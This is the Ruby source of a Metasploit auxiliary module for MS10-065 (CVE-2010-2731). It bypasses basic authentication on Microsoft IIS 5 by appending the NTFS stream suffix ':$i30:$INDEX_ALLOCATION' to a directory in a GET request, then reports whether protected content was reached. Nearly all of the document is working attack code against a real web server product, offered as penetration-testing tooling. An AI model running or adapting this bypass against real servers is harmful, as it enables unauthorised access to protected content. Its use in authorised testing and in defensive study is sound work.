##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MS10-065 Microsoft IIS 5 NTFS Stream Authentication Bypass',
        'Description' => %q{
          This module bypasses basic authentication for Internet Information Services (IIS).
          By appending the NTFS stream name to the directory name in a request, it is
          possible to bypass authentication.
        },
        'References' => [
          [ 'CVE', '2010-2731' ],
          [ 'OSVDB', '66160' ],
          [ 'MSB', 'MS10-065' ],
          [ 'URL', 'https://soroush.secproject.com/blog/2010/07/iis5-1-directory-authentication-bypass-by-using-i30index_allocation/' ]
        ],
        'Author' => [
          'Soroush Dalili',
          'sinn3r'
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2010-07-02',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI directory where basic auth is enabled', '/'])
      ]
    )
  end

  def has_auth
    uri = normalize_uri(target_uri.path)
    uri << '/' if uri[-1, 1] != '/'

    res = send_request_cgi({
      'uri' => uri,
      'method' => 'GET'
    })
    vprint_status(res.body) if res

    return (res and res.code == 401)
  end

  def try_auth
    uri = normalize_uri(target_uri.path)
    uri << '/' if uri[-1, 1] != '/'
    uri << Rex::Text.rand_text_alpha(rand(5..14)) + ".#{Rex::Text.rand_text_alpha(3)}"

    dir = File.dirname(uri) + ':$i30:$INDEX_ALLOCATION' + '/'

    user = Rex::Text.rand_text_alpha(rand(5..14))
    pass = Rex::Text.rand_text_alpha(rand(5..14))

    vprint_status("Requesting: #{dir}")
    res = send_request_cgi({
      'uri' => dir,
      'method' => 'GET',
      'authorization' => basic_auth(user, pass)
    })
    vprint_status(res.body) if res

    return (res && (res.code != 401) && (res.code != 404)) ? dir : ''
  end

  def run
    if !has_auth
      print_error('No basic authentication enabled')
      return
    end

    bypass_string = try_auth

    if bypass_string.empty?
      print_error('The bypass attempt did not work')
    else
      print_good("You can bypass auth by doing: #{bypass_string}")
    end
  end
end
